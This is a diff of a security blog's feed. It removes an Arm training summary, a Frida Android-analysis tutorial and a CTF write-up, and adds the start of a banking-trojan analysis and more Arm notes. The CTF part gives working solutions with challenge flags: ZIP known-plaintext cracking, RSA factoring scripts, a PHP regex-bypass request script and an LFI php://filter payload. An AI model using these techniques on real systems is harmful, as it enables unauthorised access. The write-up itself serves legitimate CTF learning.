-<h3 id="Hardware-Security-Components"><a href="#Hardware-Security-Components" class="headerlink" title="Hardware Security Components"></a>Hardware Security Components</h3><ul>
-<li>Arm TrustZone for secure boot, secure storage, and trusted execution environment (TEE)</li>
-<li>Cryptographic accelerators for encryption&#x2F;decryption</li>
-<li>Secure debug and trace interfaces</li>
-</ul>
-<h3 id="Power-and-Clock-Managements"><a href="#Power-and-Clock-Managements" class="headerlink" title="Power and Clock Managements"></a>Power and Clock Managements</h3><ul>
-<li>Dynamic Voltage and Frequency Scaling (DVFS) for power efficiency</li>
-<li>Clock gating, power islands and PMU (power management unit) to extend battery life and reduce thermal load</li>
-</ul>
-<p>resource <a class="link"   href="https://www.arm.com/resources/education/academic-developer-platforms" >www.arm.com/resources/education.academic-developer-platform<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Arm-based-Development-Platforms"><a href="#Arm-based-Development-Platforms" class="headerlink" title="Arm-based Development Platforms"></a>Arm-based Development Platforms</h3><h4 id="AI-Software-Development"><a href="#AI-Software-Development" class="headerlink" title="AI Software Development"></a>AI Software Development</h4><p><strong>Cortex-M Platform:</strong></p>
-<ul>
-<li><strong>Himax Grove Vision AI v2</strong><ul>
-<li>Cortex-M55 + Ethos-U55</li>
-<li>Optimized for edge AI applications</li>
-</ul>
-</li>
-</ul>
-<p><strong>Cortex-A Platform:</strong></p>
-<ul>
-<li><strong>Raspberry Pi 4</strong><ul>
-<li>Cortex-A76 + PCIe Gen3</li>
-<li>High-performance computing for AI workloads</li>
-</ul>
-</li>
-</ul>
-<h4 id="IP-Validation"><a href="#IP-Validation" class="headerlink" title="IP Validation"></a>IP Validation</h4><p><strong>Cortex-M Platform:</strong></p>
-<ul>
-<li><strong>ARM MPS3 FPGA</strong><ul>
-<li>Cortex-M55 + Ethos-U55</li>
-<li>FPGA-based validation environment</li>
-</ul>
-</li>
-</ul>
-<p><strong>Cortex-A Platform:</strong></p>
-<ul>
-<li><strong>AMD Zynq MPSoC</strong><ul>
-<li>Cortex-A53 + FPGA</li>
-<li>Hybrid ARM + FPGA development platform</li>
-</ul>
-</li>
-</ul>
-<h4 id="SoC-Emulation"><a href="#SoC-Emulation" class="headerlink" title="SoC Emulation"></a>SoC Emulation</h4><p><strong>Hardware Emulation Platform:</strong></p>
-<ul>
-<li><strong>AMD VU19P</strong><ul>
-<li>SoC hardware emulation with real-world data</li>
-<li>Enterprise-grade emulation capabilities</li>
-</ul>
-</li>
-</ul>
-<p><em>Resource: <a class="link"   href="https://www.arm.com/resources/education/academic-developer-platforms" >www.arm.com/resources/education/academic-developer-platforms<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></em></p>
-<p>nanoSoc Silicom from SOC Labs<br>Fast-kNN<br>Academic Silicon cortex-M55 + ethos-U55 (tsmc n16)</p>
-<p>wiki.seedstudio.com&#x2F;grove_vision_ai_v2</p>
-<h3 id="Early-software-development-using-arm-virtual-hardware"><a href="#Early-software-development-using-arm-virtual-hardware" class="headerlink" title="Early software development using arm virtual hardware"></a>Early software development using arm virtual hardware</h3><p>Arm virtual hardware (AVH)<br>AVH fixed virtual platforms (FVPs)<br>AVH corellium models</p>
-<h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><ul>
-<li>Architecture Design and HW &amp; SW Partition<ul>
-<li>Hardware Virtual Modeling</li>
-<li>FPGA Prototyping</li>
-</ul>
-</li>
-<li>Hardware IP Design and SoC integration<ul>
-<li>Select IP Cores</li>
-<li>SoC Hardware Integration</li>
-<li>Functional Simulation</li>
-</ul>
-</li>
-<li>Software development<ul>
-<li>Develop Device drivers</li>
-<li>Build Linux OS Kernels</li>
-<li>Create applications software</li>
-</ul>
-</li>
-<li>Use cases<ul>
-<li>Functional Verification</li>
-<li>Boot code and OS Bring up</li>
-<li>Performance Analysis</li>
-</ul>
-</li>
-</ul>
-<h1 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h1>]]></content>
-  </entry>
-  <entry>
-    <title>APK Analysis Frida</title>
-    <url>/2025/06/04/APK-Analysis-Frida/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><p>What is Frida?<br>Frida is a toolkit that enables dynamic interaction with running programs.</p>
-<h2 id="Installing-Frida"><a href="#Installing-Frida" class="headerlink" title="Installing Frida"></a>Installing Frida</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure></div>
-<p>Then test the installation:</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida --version</span><br></pre></td></tr></table></figure></div>
-<p>Next, match your device’s architecture (use adb shell getprop ro.product.cpu.abi)</p>
-<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Using-Frida-for-APK-Analysis"><a href="#Using-Frida-for-APK-Analysis" class="headerlink" title="Using Frida for APK Analysis"></a>Using Frida for APK Analysis</h2><ol>
-<li><strong>Connect your Android device</strong> via USB and ensure USB debugging is enabled.</li>
-<li><strong>Start the Frida server</strong> on your Android device: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">frida-server &amp;</span><br></pre></td></tr></table></figure></div></li>
-<li><strong>List running processes</strong> to find your target app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure></div></li>
-<li><strong>Attach to the target app</strong> using its process ID or name: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U -n &lt;app_name&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li><strong>Inject scripts</strong> to manipulate or analyze the app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">frida -U -l your_script.js -n &lt;app_name&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li><strong>Use Frida’s REPL</strong> to interactively explore the app: <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">    frida -U -n &lt;app_name&gt; -f &lt;app_name&gt; --no</span><br><span class="line">-pause</span><br></pre></td></tr></table></figure></div></li>
-<li><strong>Write custom scripts</strong> to hook functions, modify behavior, or extract data: <div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.app.MainActivity&#x27;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">someMethod</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;someMethod called&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">someMethod</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div></li>
-</ol>
-]]></content>
-  </entry>
-  <entry>
-    <title>EQFCTF 2025</title>
-    <url>/2025/01/18/EQFCTF-2025/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Join-Our-Discord"><a href="#Join-Our-Discord" class="headerlink" title="Join Our Discord"></a>Join Our Discord</h2><ul>
-<li>Just join the discord and there is the flag on the annoucment channel <code>RVFDVEZ7VzNsQzBtM19UMF9FcXVpbGlicml1bV9EMXNjMHJkfQ==</code><br>cyberchef it and get the flag <code>EQCTF&#123;W3lC0m3_T0_Equilibrium_D1sc0rd&#125;</code></li>
-</ul>
-<h1 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h1><h2 id="Velociraptor"><a href="#Velociraptor" class="headerlink" title="Velociraptor"></a>Velociraptor</h2><ol>
-<li>Download the attach file</li>
-<li>VeLoCiraptor\C\Users\kelvin\AppData\Roaming\Microsoft\Windows\Recent<ul>
-<li>We can found some hash on this page with the file name <code>RVFDVEZ7MXRzX3IzNExseV9o and MG1ldzBya190UnVTdF9tMyF9</code><br> <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/image.png"
-                      alt="image"
-                ></li>
-</ul>
-</li>
-<li>Then just cyberchef it.</li>
-</ol>
-<h2 id="Kuih-Lapis"><a href="#Kuih-Lapis" class="headerlink" title="Kuih Lapis"></a>Kuih Lapis</h2><ol>
-<li>Download the poem.pdf file</li>
-<li>Throw it into <a class="link"   href="https://pdfcrowd.com/inspect-pdf/" >pdf inspect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> website and we will see all the details in this page<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/image11.png"
-                      alt="image"
-                ></li>
-<li>And we can see the details and flag at here <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/image222.png"
-                      alt="image"
-                ></li>
-</ol>
-<h2 id="Lost-Password"><a href="#Lost-Password" class="headerlink" title="Lost Password"></a>Lost Password</h2><ol>
-<li>Download the zip file.</li>
-<li>We can see inside have cloud_password.txt and a index.html file. <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/imagebk1.png"
-                      alt="image"
-                ></li>
-<li>With the use of BKCrack, we can use known plaintext attack on pkzip</li>
-<li>Next find the common bytes in the index.html file(why html file? as we dont know the starters of the cloud_password.txt) <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/imagebk2.png"
-                      alt="image"
-                >.</li>
-<li>Save those code in a file call bin </li>
-<li>Then <code>bkcrack -C html.zip -c &quot;index.html&quot; -p bin</code></li>
-<li>After getting the key, Continue to crack it</li>
-<li><code>bkcrack -C html.zip -k 1d63e85a b3b66126 33619315 -U bkbk.zip 1234</code></li>
-</ol>
-<p>1d63e85a b3b66126 33619315 is the key, and 1234 is the password we set.<br>9. then unzip the zip file bkbk.zip with pass 1234.<br>10. Thats it the flag here<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/imagelah.png"
-                      alt="flag"
-                ></p>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Neighbour-RSA"><a href="#Neighbour-RSA" class="headerlink" title="Neighbour RSA"></a>Neighbour RSA</h2><ol>
-<li>Download the file, then see the rsa encrypted code<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, mpz</span><br><span class="line">def fermat_factorization(N):</span><br><span class="line">    a = isqrt(N) + 1</span><br><span class="line">    b2 = a * a - N</span><br><span class="line">    while not is_square(b2):</span><br><span class="line">        a += 1</span><br><span class="line">        b2 = a * a - N</span><br><span class="line">    b = isqrt(b2)</span><br><span class="line">    return a - b, a + b</span><br><span class="line"></span><br><span class="line">def is_square(n):</span><br><span class="line">    return isqrt(n) ** 2 == n</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 14587704432822344892341272427282646120364434437414523883376089608218979364959927948590898540264210246449374363014541914863792835772986609660515612532877044074684115597786182642011407163350289201826895454398548254854919237599957739718174053771619150887665707867636064460914489445835497948439951659044458159773886454887057327846897569977945202458245268351728125973721764332352011029125694046428350269451464778793326007087955043888570293765138721335344787054343738337660927131968049415376352589981259058448540690666004751490375493430556965591293772542601776934892741235532054785639594081598607404023545471998403197674267</span><br><span class="line">e = 65537</span><br><span class="line">C = 7329184746351979600304810893726842767688467204256990201181172159445966473650977905122553415838916142690364388789400790015517642902297387406215773278164829517035052625373870964570981590734714495297149889660019174034119566329569798047522829383224123884562703447321306836996392334132844673471179765556339187200820259655159008340673516040862000226792914228312336356120448967504158288031247387263438925257977725844911872753683719735641011693324441777888582417108481882731436005780409094974241968759397096299213838515746566064813787517925040756180508206242396925444425306180593790729890681708626826056328684043890127100581</span><br><span class="line"></span><br><span class="line"># Step 1: Factorize N</span><br><span class="line">p, q = fermat_factorization(N)</span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 2: Compute the private key d</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(f&quot;d = &#123;d&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 3: Decrypt the ciphertext C</span><br><span class="line">plaintext = pow(C, d, N)</span><br><span class="line">print(f&quot;Plaintext (as long): &#123;plaintext&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 4: Convert the plaintext to bytes</span><br><span class="line">flag = long_to_bytes(plaintext)</span><br><span class="line">print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)</span><br></pre></td></tr></table></figure></div></li>
-<li>Then decrypt it! <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import inverse, long_to_bytes</span><br><span class="line">from gmpy2 import isqrt, mpz</span><br><span class="line">def fermat_factorization(N):</span><br><span class="line">a = isqrt(N) + 1</span><br><span class="line">b2 = a * a - N</span><br><span class="line">while not is_square(b2):</span><br><span class="line">    a += 1</span><br><span class="line">    b2 = a * a - N</span><br><span class="line">b = isqrt(b2)</span><br><span class="line">return a - b, a + b</span><br><span class="line"></span><br><span class="line">def is_square(n):</span><br><span class="line">return isqrt(n) ** 2 == n</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 14587704432822344892341272427282646120364434437414523883376089608218979364959927948590898540264210246449374363014541914863792835772986609660515612532877044074684115597786182642011407163350289201826895454398548254854919237599957739718174053771619150887665707867636064460914489445835497948439951659044458159773886454887057327846897569977945202458245268351728125973721764332352011029125694046428350269451464778793326007087955043888570293765138721335344787054343738337660927131968049415376352589981259058448540690666004751490375493430556965591293772542601776934892741235532054785639594081598607404023545471998403197674267</span><br><span class="line">e = 65537</span><br><span class="line">C = 7329184746351979600304810893726842767688467204256990201181172159445966473650977905122553415838916142690364388789400790015517642902297387406215773278164829517035052625373870964570981590734714495297149889660019174034119566329569798047522829383224123884562703447321306836996392334132844673471179765556339187200820259655159008340673516040862000226792914228312336356120448967504158288031247387263438925257977725844911872753683719735641011693324441777888582417108481882731436005780409094974241968759397096299213838515746566064813787517925040756180508206242396925444425306180593790729890681708626826056328684043890127100581</span><br><span class="line"></span><br><span class="line"># Step 1: Factorize N</span><br><span class="line">p, q = fermat_factorization(N)</span><br><span class="line">print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 2: Compute the private key d</span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(f&quot;d = &#123;d&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 3: Decrypt the ciphertext C</span><br><span class="line">plaintext = pow(C, d, N)</span><br><span class="line">print(f&quot;Plaintext (as long): &#123;plaintext&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># Step 4: Convert the plaintext to bytes</span><br><span class="line">flag = long_to_bytes(plaintext)</span><br><span class="line">print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)&lt;/p&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li>and here is it the flag</li>
-</ol>
-<h2 id="Neighbour-RSA-2"><a href="#Neighbour-RSA-2" class="headerlink" title="Neighbour RSA_2"></a>Neighbour RSA_2</h2><ol>
-<li>Here is the original code provided<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import prev_prime as next_prime</span><br><span class="line">import secrets</span><br><span class="line"></span><br><span class="line">flag = b&quot;EQCTF&#123;&lt;REDACTED&gt;&#125;&quot;</span><br><span class="line">a = bytes_to_long(secrets.token_bytes(100))</span><br><span class="line"></span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = next_prime(a+p)</span><br><span class="line"></span><br><span class="line">N = int(p*q)</span><br><span class="line">e = 65537</span><br><span class="line">f = int(q+a-p)</span><br><span class="line"></span><br><span class="line">C = pow(bytes_to_long(flag),e,N)</span><br><span class="line"></span><br><span class="line">print(f&quot;&#123;N=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;e=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;C=&#125;&quot;)</span><br><span class="line">print(f&quot;&#123;f=&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># N=10986069679740899320769487987259965136338163538313920951921558170716399011131571749355967327929782757252961432250665732844670832757630969990974354211674665217879301194915967815961901955331119097862220567741900953344002421010199387139438258915388299120537312319419560196095221842536034797857570594271497968571543268632342368822758109031157038270115475046299925831141039892806064466450571546834222025788616070408548026473179492912530200671560292851465500255213172920644302815477881129226831758156389887396481079039150256181152083078507883863985140189407376955776873853730599843478872399976242973508423433618152961348309</span><br><span class="line"># e=65537</span><br><span class="line"># C=2195468989281538327484120144714886786222108443822386213335264431639447179575013802497596322014889540032797783666693430103844035492180467143334243466603968944829680836129211979667061913058333561267630828758422011805278536599370681276716534375047691415305153173304117404635308274845621779917651565487097467077938208235595083835638297185421167329868537607503750906624903899336968072524704962983010525959106240384416922803445710408493786560172567404469778095227805268385869729463091111594408973206573286013513443234182105724723290297083787222131780636442462497223002541517291130831271935451970740180808267897428166746499</span><br><span class="line"># f=4203301120017181153512192371191327436380286582036247438379481982220240276670686609670968370331071343886281566516951351186472802979725501149166852576293749655990806367361286991990410689444889766967820170478115967009340001288791419622177173652</span><br></pre></td></tr></table></figure></div></li>
-<li>Decrypt it<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes, inverse</span><br><span class="line">from gmpy2 import isqrt</span><br><span class="line"></span><br><span class="line"># Given values</span><br><span class="line">N = 10986069679740899320769487987259965136338163538313920951921558170716399011131571749355967327929782757252961432250665732844670832757630969990974354211674665217879301194915967815961901955331119097862220567741900953344002421010199387139438258915388299120537312319419560196095221842536034797857570594271497968571543268632342368822758109031157038270115475046299925831141039892806064466450571546834222025788616070408548026473179492912530200671560292851465500255213172920644302815477881129226831758156389887396481079039150256181152083078507883863985140189407376955776873853730599843478872399976242973508423433618152961348309</span><br><span class="line">e = 65537</span><br><span class="line">C = 2195468989281538327484120144714886786222108443822386213335264431639447179575013802497596322014889540032797783666693430103844035492180467143334243466603968944829680836129211979667061913058333561267630828758422011805278536599370681276716534375047691415305153173304117404635308274845621779917651565487097467077938208235595083835638297185421167329868537607503750906624903899336968072524704962983010525959106240384416922803445710408493786560172567404469778095227805268385869729463091111594408973206573286013513443234182105724723290297083787222131780636442462497223002541517291130831271935451970740180808267897428166746499</span><br><span class="line">f = 4203301120017181153512192371191327436380286582036247438379481982220240276670686609670968370331071343886281566516951351186472802979725501149166852576293749655990806367361286991990410689444889766967820170478115967009340001288791419622177173652</span><br><span class="line"></span><br><span class="line"># Approximate a</span><br><span class="line">a_approx = f // 2</span><br><span class="line"></span><br><span class="line"># Define a small range around a_approx</span><br><span class="line">range_size = 1000  # Adjust this range as needed</span><br><span class="line"></span><br><span class="line"># Iterate over the range</span><br><span class="line">for delta in range(-range_size, range_size + 1):</span><br><span class="line">    a = a_approx + delta</span><br><span class="line"></span><br><span class="line">    # Solve the quadratic equation: p^2 + (f - a) * p - N = 0</span><br><span class="line">    A = 1</span><br><span class="line">    B = f - a</span><br><span class="line">    C_eq = -N</span><br><span class="line"></span><br><span class="line">    # Discriminant</span><br><span class="line">    discriminant = B**2 - 4 * A * C_eq</span><br><span class="line"></span><br><span class="line">    # Check if discriminant is a perfect square</span><br><span class="line">    if discriminant &gt;= 0:</span><br><span class="line">        sqrt_discriminant = isqrt(discriminant)</span><br><span class="line">        if sqrt_discriminant * sqrt_discriminant == discriminant:</span><br><span class="line">            # Solve for p</span><br><span class="line">            p_candidate = (-B + sqrt_discriminant) // (2 * A)</span><br><span class="line"></span><br><span class="line">            # Check if p_candidate is a factor of N</span><br><span class="line">            if N % p_candidate == 0:</span><br><span class="line">                p = p_candidate</span><br><span class="line">                q = N // p</span><br><span class="line">                print(f&quot;Found p and q:&quot;)</span><br><span class="line">                print(f&quot;p = &#123;p&#125;&quot;)</span><br><span class="line">                print(f&quot;q = &#123;q&#125;&quot;)</span><br><span class="line"></span><br><span class="line">                # Compute phi(N)</span><br><span class="line">                phi = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line">                # Compute the private key d</span><br><span class="line">                d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">                # Decrypt the ciphertext</span><br><span class="line">                plaintext = pow(C, d, N)</span><br><span class="line"></span><br><span class="line">                # Convert the plaintext to bytes</span><br><span class="line">                flag = long_to_bytes(plaintext)</span><br><span class="line">                print(f&quot;Flag: &#123;flag.decode()&#125;&quot;)</span><br><span class="line">                break</span><br><span class="line">    else:</span><br><span class="line">        continue</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Failed to factorize N.&quot;)</span><br></pre></td></tr></table></figure></div></li>
-<li>Anddd there you go the flag</li>
-</ol>
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="EggSecret"><a href="#EggSecret" class="headerlink" title="EggSecret"></a>EggSecret</h2><ol>
-<li><p>First download the file attached and lets see whats inside.</p>
-</li>
-<li><p>We can see that there is a secret hash at there <code>00e39786989574093743872279278460</code> also there is something we need to bypass <code>(preg_match(&quot;/^(.*?)+$/s&quot;, $egg))</code></p>
-</li>
-<li><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://135.181.88.229:31730/&quot;</span><br><span class="line">params = &#123;&quot;eggSecret&quot;: &quot;240610708&quot;&#125;  # String with MD5 hash starting with &quot;0e&quot;</span><br><span class="line">data = &#123;&quot;egg&quot;: &quot;A&quot; * 10000&#125;  # Very large input to bypass the regex</span><br><span class="line">response = requests.post(url, params=params, data=data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>and we can get the flag content.</p>
-</li>
-</ol>
-<h2 id="KingsBrew"><a href="#KingsBrew" class="headerlink" title="KingsBrew"></a>KingsBrew</h2><ol>
-<li>First we get into the website using the host and port given.</li>
-<li>According to the hint it should be something menu as when you press {drink and flag!} it jump out menu.php.</li>
-<li>After we test, LFI is usable in this case</li>
-<li><code>http://135.181.88.229:35206/?page=php://filter/convert.base64-encode/resource=menu.php</code></li>
-<li>This is one of LFI payloads of PHP filters to read menu.php without executing PHP and decode the base 64 by ourself using cyberchef.</li>
-</ol>
-<h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Who’s-that-pukimon"><a href="#Who’s-that-pukimon" class="headerlink" title="Who’s that pukimon"></a>Who’s that pukimon</h2><ol>
-<li>Download the APK Andorid files and open it in a android emulator(Im using andorid studio)</li>
-<li>We can see that this is a game that we need to guess who is this Pokemon (pukimon)<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/22.png"
-                      alt="gueessss"
-                ></li>
-<li>With the use of jadx-gui</li>
-<li>We can see that the main activity files is mainactivity<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/11.png"
-                      alt="main"
-                ></li>
-<li>Find it out at (source&#x2F;io.eqctf.pukimon&#x2F;MainActivitykt) </li>
-<li><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/33.png"
-                      alt="hey"
-                ><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    /* JADX INFO: Access modifiers changed from: private */</span><br><span class="line">    public static final Unit a$lambda$11$lambda$10(Context yeet, MutableState a$delegate) &#123;</span><br><span class="line">        Intrinsics.checkNotNullParameter(yeet, &quot;$yeet&quot;);</span><br><span class="line">        Intrinsics.checkNotNullParameter(a$delegate, &quot;$a$delegate&quot;);</span><br><span class="line">        if (a(a$lambda$6(a$delegate))) &#123;</span><br><span class="line">            Toast.makeText(yeet, &quot;It&#x27;s &quot; + a$lambda$6(a$delegate), 0).show();</span><br><span class="line">            byte[] decode = Base64.decode(&quot;AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9&quot;, 0);</span><br><span class="line">            Intrinsics.checkNotNullExpressionValue(decode, &quot;decode(...)&quot;);</span><br><span class="line">            Log.d(&quot;Flag&quot;, &quot;Congratz on guessing the pokemon: &quot;.concat(new String(decode, Charsets.UTF_8)));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Toast.makeText(yeet, &quot;It&#x27;s not &quot; + a$lambda$6(a$delegate), 0).show();</span><br><span class="line">        &#125;</span><br><span class="line">        return Unit.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
-<li>Decode <code>AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9</code> with cyberchef and we can get the flag EQCTF{1Ts_Shr0oMr1sHiE!!!!}</li>
-</ol>
-<h2 id="Capture-that-Pukimon"><a href="#Capture-that-Pukimon" class="headerlink" title="Capture that Pukimon"></a>Capture that Pukimon</h2><ol>
-<li>With the use of http toolkit, we can intercept the data from the firebase<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/shrommie.png"
-                      alt="shrommie"
-                ></li>
-<li>And thats the flag EQCTF{Int3RcEpT_da_Tr3FfiC}”</li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF 2025</category>
-      </categories>
-      <tags>
-        <tag>Forensics</tag>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Technical Analysis of Android Malware - Banking Trojan</title>
     <url>/2025/05/11/Analysis-of-Malware-APK/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>During a routine security intelligence exchange with my senior <a class="link"   href="https://www.linkedin.com/in/aan0303/" >Ann<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> from CyberX, I received a suspicious Android application package (APK) for analysis. The sample, disguised as a legitimate banking application (<code>maybank2u.apk</code>), demonstrated significant malicious capabilities warranting a comprehensive technical investigation.</p>
@@ -1094,6 +415,339 @@
       </tags>
   </entry>
   <entry>
+    <title>Arm-Malaysia On Demand Training</title>
+    <url>/2025/07/28/Arm-Malaysia-On-Demand-Traning/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script><h1 id="Arm-Malaysia-On-Demand-Training"><a href="#Arm-Malaysia-On-Demand-Training" class="headerlink" title="Arm-Malaysia On Demand Training"></a>Arm-Malaysia On Demand Training</h1><h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><h3 id="Introduction-to-ARM"><a href="#Introduction-to-ARM" class="headerlink" title="Introduction to ARM"></a>Introduction to ARM</h3><p>ARM stands for Advanced RISC Machine, a family of computer processors that are widely used in mobile devices, embedded systems, and increasingly in servers and desktops. ARM processors are known for their power efficiency and performance. Almost 100% of smartphones and tablets use ARM processors, making them a dominant force in the mobile computing market.</p>
+<p>Arm’s Company is a British semiconductor and software design company, known for its ARM architecture. The company designs the ARM architecture and licenses it to other companies like Apple, Samsung, MediaTek and many more.</p>
+<h3 id="Introduction-to-ARM-CPU-Architecture"><a href="#Introduction-to-ARM-CPU-Architecture" class="headerlink" title="Introduction to ARM CPU Architecture"></a>Introduction to ARM CPU Architecture</h3><p>The ARM CPU architecture defines a CPU’s behavior when software runs on it.</p>
+<ul>
+<li>CPU architecture defines the basic instruction set and the exception and memory models that are relied on by the operating system and hypervisor</li>
+<li>CPU microarchitecture defines the implementation of the CPU architecture, including the pipeline, cache, and other hardware features.</li>
+</ul>
